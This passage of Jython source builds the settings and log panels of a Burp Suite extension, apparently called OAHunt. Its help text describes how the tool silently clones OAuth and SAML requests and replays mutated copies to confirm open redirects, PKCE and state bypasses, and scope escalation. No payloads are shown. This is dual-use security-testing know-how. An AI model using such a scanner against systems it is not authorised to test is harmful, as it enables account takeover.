        save_btn.addActionListener(
            SaveSettingsAction(e, scope_field, threads_field))

        rows = [
            ("Scope filter (comma-sep hosts, blank=all):", scope_field),
            ("Background threads (1-20):", threads_field),
        ]
        for i, (lbl_txt, widget) in enumerate(rows):
            gbc.gridx, gbc.gridy, gbc.weightx = 0, i, 0
            lbl = JLabel(lbl_txt)
            lbl.setFont(Font("Monospaced", Font.BOLD, 11))
            lbl.setForeground(C_ACCENT)
            p.add(lbl, gbc)
            gbc.gridx, gbc.weightx = 1, 1.0
            p.add(widget, gbc)

        gbc.gridx, gbc.gridy, gbc.weightx = 1, len(rows), 0
        p.add(save_btn, gbc)

        info = self._textarea()
        info.setEditable(False)
        info.setForeground(C_MUTED)
        info.setText(
            "\nOAHunt v3 — How It Works\n\n"
            "Design: Like the Authorize extension.\n\n"
            "  1. Your browser request flows through Burp proxy NORMALLY.\n"
            "     Nothing is modified, nothing restarts.\n\n"
            "  2. OAHunt silently clones each OAuth/SAML request.\n"
            "     Clones are byte-copies — independent of the browser session.\n\n"
            "  3. Attack jobs run in a background thread pool.\n"
            "     Each job mutates its own clone with one payload and sends\n"
            "     it via makeHttpRequest() — totally separate from your browser.\n\n"
            "  4. If a response CONFIRMS exploitation, the finding is reported.\n"
            "     No guessing. No pattern matching. Real proof only.\n\n"
            "Checks performed (all confirmed by response):\n"
            "  - Open redirect (all redirect-like params)\n"
            "  - redirect_uri prefix match bypass (Auth0 style)\n"
            "  - State/CSRF - replays without state, confirms server accepts\n"
            "  - PKCE bypass - strips code_challenge, confirms code issued\n"
            "  - Scope escalation - elevated scope confirmed by server\n"
            "  - Post-auth redirect param injection (returnTo, next, goto...)\n"
            "  - g2g/interceptor cookie bypass\n"
            "  - SAML RelayState open redirect\n"
            "  - Auth cookie missing security flags\n\n"
            "All confirmation requests appear in Burp Proxy history\n"
            "with User-Agent containing 'OAuthHunter'.\n\n"
            "Export: /tmp/oauthhunter_confirmed.json\n"
        )
        gbc.gridx, gbc.gridy      = 0, len(rows) + 1
        gbc.gridwidth, gbc.weightx = 2, 1.0
        gbc.weighty, gbc.fill      = 1.0, GridBagConstraints.BOTH
        p.add(JScrollPane(info), gbc)
        return p

    def _log_tab(self):
        e = self.ext
        p = JPanel(BorderLayout())
        p.setBackground(C_BG)

        area = JTextArea()
        area.setBackground(C_BG)
        area.setForeground(C_MUTED)
        area.setFont(Font("Monospaced", Font.PLAIN, 10))
        area.setEditable(False)
        area.setBorder(BorderFactory.createEmptyBorder(6, 8, 6, 8))
        e._log_area = area

        clear_btn = self._btn("Clear Log", C_MUTED)
        clear_btn.addActionListener(ClearLogAction(area))

        p.add(JScrollPane(area), BorderLayout.CENTER)
        p.add(clear_btn,         BorderLayout.SOUTH)
        return p

    def _btn(self, txt, fg=C_TEXT):
        b = JButton(txt)
        b.setFont(Font("Monospaced", Font.PLAIN, 11))
        b.setBackground(C_SURFACE)
        b.setForeground(fg)
        b.setFocusPainted(False)
        return b

    def _table(self, model):
        t = JTable(model)
        t.setBackground(C_SURFACE)
        t.setForeground(C_TEXT)
        t.setGridColor(C_BORDER)
        t.setSelectionBackground(C_ACCENT.darker())
        t.setFont(Font("Monospaced", Font.PLAIN, 11))
        t.getTableHeader().setBackground(C_BG)
        t.getTableHeader().setForeground(C_ACCENT)
        t.getTableHeader().setFont(Font("Monospaced", Font.BOLD, 11))
        t.setRowHeight(22)
        t.setAutoResizeMode(JTable.AUTO_RESIZE_OFF)
        return t

    def _textarea(self):
        a = JTextArea()
        a.setBackground(C_BG)
        a.setForeground(C_TEXT)
        a.setFont(Font("Monospaced", Font.PLAIN, 11))
        a.setEditable(False)
        a.setLineWrap(True)
        a.setWrapStyleWord(True)
        a.setBorder(BorderFactory.createEmptyBorder(8, 10, 8, 10))
        return a
